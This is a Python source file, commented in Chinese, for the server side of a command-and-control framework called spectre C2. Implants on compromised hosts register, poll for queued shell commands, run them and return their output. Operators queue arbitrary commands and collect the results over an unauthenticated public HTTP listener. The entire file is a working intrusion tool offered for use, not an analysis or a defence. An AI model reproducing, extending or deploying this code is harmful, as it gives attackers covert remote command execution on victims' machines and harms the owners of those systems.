#!/usr/bin/env python3
"""Beacon listener — C2 会话接收端(spectre C2 操作员侧最小切片)。

与 OOB 收集器(:19999, 单向回调判收)互补: 本服务是**双向**任务信道——
植入端(beacon)轮询取任务、执行、回传结果; 操作员侧(shells.mjs
transport='beacon')入队任务并等待回传。协议刻意极简(HTTP+JSON, 无认证
——与 OOB 收集器同形态: 公网监听, 配额是工程防滥不是访问控制); 加密/
伪装层属载荷侧(AOQ/1.0)职责, 不在本服务范围。

端点:
  GET  /health              → {"ok":true,"shells":N}
  POST /hello/<sid>         → beacon 上线登记 {"user","os","info"} → {"ok":true,"interval":5}
  GET  /task/<sid>          → {"id","cmd"} 或 204 无 body(keep-alive 安全)
  POST /result/<sid>        → {"id","stdout","code"} → {"ok":true}
  POST /op/<sid>            → 操作员入队 {"cmd"} → {"id"}
  GET  /op/<sid>?id=<id>    → {"id","stdout","code","ms"} 或 202(未回传)

sid = shell 注册表 id(sh-xxxx, 注册回执携带); 队列落盘
$SPECTRE_DATA_DIR/beacon/q-<sid>.json(原子写)。ThreadingHTTPServer 下
所有 读-改-写 全程持 per-sid 锁——beacon(取任务/回传)与 operator(入队/
轮询)是两个进程两侧并发, 无锁的整文件覆盖会静默丢任务。任务 TTL 10min,
每 shell 待办 ≤16/结果保留 ≤16(迟到回传可查, 超限最旧丢弃)。
"""
import json
import os
import re
import secrets
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PORT = int(os.environ.get("BEACON_PORT", "19997"))
DATA_DIR = os.environ.get("SPECTRE_DATA_DIR", "")
MAX_BODY = 1 << 20          # 1MB 请求体上限(命令与结果远小于此)
MAX_QUEUE = 16              # 每 shell 待办任务上限
MAX_RESULTS = 16            # 每 shell 结果保留条数
TASK_TTL = 600              # 任务 10min 未取走即过期(GC)
SID_RE = re.compile(r"^[A-Za-z0-9._-]{1,64}$")
ROUTE_RE = re.compile(r"^/(hello|task|result|op)/([^/]+)$")


def fail(msg, code=1):
    print(f"[beacon-listener] FATAL: {msg}", file=sys.stderr)
    sys.exit(code)


if not DATA_DIR:
    fail("SPECTRE_DATA_DIR 未设置——队列需要持久化目录"
         "(共享机部署见 deploy/README; 测试用 SPECTRE_DATA_DIR=/tmp/...)")
if not (1 <= PORT <= 65535):
    fail(f"BEACON_PORT={PORT} 非法(须 1-65535)")

STATE = Path(DATA_DIR) / "beacon"
STATE.mkdir(parents=True, exist_ok=True)

_print = print


def log(*a):
    _print("[beacon-listener]", *a, file=sys.stderr, flush=True)


# ---- per-sid 队列锁: beacon 与 operator 两侧进程并发 RMW 的丢失防线 ----
_locks = {}
_locks_guard = threading.Lock()


def sid_lock(sid):
    with _locks_guard:
        lk = _locks.get(sid)
        if lk is None:
            lk = _locks[sid] = threading.Lock()
        return lk


def q_path(sid):
    return STATE / f"q-{sid}.json"


def load_q(sid):
    try:
        return json.loads(q_path(sid).read_text())
    except Exception:
        return {"hello": None, "tasks": [], "results": []}


def store_q(sid, q):
    tmp = q_path(sid).with_suffix(".tmp")
    tmp.write_text(json.dumps(q, ensure_ascii=False))
    os.replace(tmp, q_path(sid))


def gc_q(q):
    """惰性 GC: 过期任务出队 + 结果截尾。"""
    now = time.time()
    q["tasks"] = [t for t in q.get("tasks", []) if now - t["ts"] < TASK_TTL]
    q["results"] = q.get("results", [])[-MAX_RESULTS:]


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    # ---- helpers ----
    def _reply(self, code, obj=None):
        if code == 204:  # 204 不得携带 body(RFC 7230)——stdlib http.client
            # keep-alive 下残留字节会毒化下一响应解析
            self.send_response(204)
            self.end_headers()
            return
        body = json.dumps(obj or {"ok": True}, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        if self.close_connection:  # 早退弃连路径——显式告知(RFC 7230 §6.6 SHOULD)
            self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def _early_reply(self, code, obj=None):
        # 系统性守卫(终审 round3): 请求体未消费的任何早退回复(路由 404/
        # 超限 413/畸形 CL 400)一律弃连——未排空 body 的残留字节会毒化
        # keep-alive 下一响应, 与 204 无 body 是同一条不变量。同族路径
        # 一个守卫全覆盖(逐点补漏已被审查三连实证会漏: 204→413→CL→404)。
        self.close_connection = True
        self._reply(code, obj)

    def _read_json(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            self._early_reply(400, {"ok": False, "error": "Content-Length 非整数"})
            return None
        if n > MAX_BODY:
            self._early_reply(413, {"ok": False, "error": f"body>{MAX_BODY}B"})
            return None
        raw = self.rfile.read(n) if n else b""
        try:
            return json.loads(raw or b"{}")
        except Exception:
            self._reply(400, {"ok": False, "error": "bad json"})  # body 已读净——连接可信, 不弃
            return None


    def _route(self):
        """(base, sid) 或 (None, None)——路由段是第二段, 尾段是 sid。"""
        m = ROUTE_RE.match(self.path.split("?")[0])
        if not m or not SID_RE.match(m.group(2)):
            self._early_reply(404, {"ok": False, "error": "unknown"})
            return None, None
        return m.group(1), m.group(2)

    def log_message(self, fmt, *args):  # 默认噪音改走 stderr 单行
        log(self.address_string(), fmt % args)

    # ---- POST: hello / result / op ----
    def do_POST(self):
        base, sid = self._route()
        if sid is None:
            return
        body = self._read_json()
        if body is None:
            return
        with sid_lock(sid):
            q = load_q(sid)
            gc_q(q)
            if base == "hello":
                q["hello"] = {"user": str(body.get("user", ""))[:64],
                              "os": str(body.get("os", ""))[:200],
                              "info": str(body.get("info", ""))[:500],
                              "ts": time.time()}
                store_q(sid, q)
                log(f"hello {sid} user={body.get('user', '?')}")
                self._reply(200, {"ok": True, "interval": 5})
                return
            if base == "result":
                rid = str(body.get("id", ""))
                hit = next((t for t in q["tasks"] if t["id"] == rid), None)
                if not hit:
                    self._reply(404, {"ok": False, "error": f"task {rid} 不存在/已过期"})
                    return
                try:
                    code = int(body.get("code", 0))
                except (TypeError, ValueError):
                    self._reply(400, {"ok": False, "error": "code 须为整数(命令退出码)"})
                    return
                q["tasks"].remove(hit)
                q["results"].append({"id": rid,
                                     "stdout": str(body.get("stdout", ""))[:65536],
                                     "stderr": str(body.get("stderr", ""))[:8192],
                                     "code": code,
                                     "ms": int((time.time() - hit["ts"]) * 1000),
                                     "ts": time.time()})
                gc_q(q)
                store_q(sid, q)
                self._reply(200)
                return
            if base == "op":
                cmd = str(body.get("cmd", ""))
                if not cmd.strip():
                    self._reply(400, {"ok": False, "error": "cmd 必填"})
                    return
                if len(q["tasks"]) >= MAX_QUEUE:
                    self._reply(429, {"ok": False,
                                      "error": f"待办已满({MAX_QUEUE}, beacon 离线?)——先探活再派发"})
                    return
                rid = secrets.token_urlsafe(8)
                q["tasks"].append({"id": rid, "cmd": cmd, "ts": time.time()})
                store_q(sid, q)
                log(f"op {sid} enqueue {rid} ({len(cmd)}B)")
                self._reply(200, {"id": rid})
                return
            self._reply(404, {"ok": False, "error": "unknown"})

    # ---- GET: health / task / op ----
    def do_GET(self):
        if self.path.split("?")[0] == "/health":
            self._reply(200, {"ok": True, "shells": len(list(STATE.glob("q-*.json")))})
            return
        base, sid = self._route()
        if sid is None:
            return
        _, _, query = self.path.partition("?")
        with sid_lock(sid):
            q = load_q(sid)
            gc_q(q)
            if base == "task":
                if q["tasks"]:
                    t = q["tasks"][0]
                    # 任务出队延迟到 result——beacon 崩溃则 TTL 自然回收
                    self._reply(200, {"id": t["id"], "cmd": t["cmd"]})
                else:
                    self._reply(204)
                return
            if base == "op":
                from urllib.parse import parse_qs
                rid = (parse_qs(query).get("id") or [""])[0]
                hit = next((r for r in q["results"] if r["id"] == rid), None)
                if hit:
                    self._reply(200, hit)
                else:
                    pending = any(t["id"] == rid for t in q["tasks"])
                    self._reply(202 if pending else 404,
                                {"ok": False, "error": "pending" if pending else "unknown id"})
                return
            self._reply(404, {"ok": False, "error": "unknown"})


if __name__ == "__main__":
    addr = ("0.0.0.0", PORT)
    log(f"listening {addr[0]}:{addr[1]} state={STATE} (no auth — 与 OOB 收集器同形态)")
    try:
        ThreadingHTTPServer(addr, Handler).serve_forever()
    except OSError as e:
        fail(f"无法监听 {addr[1]}: {e}")
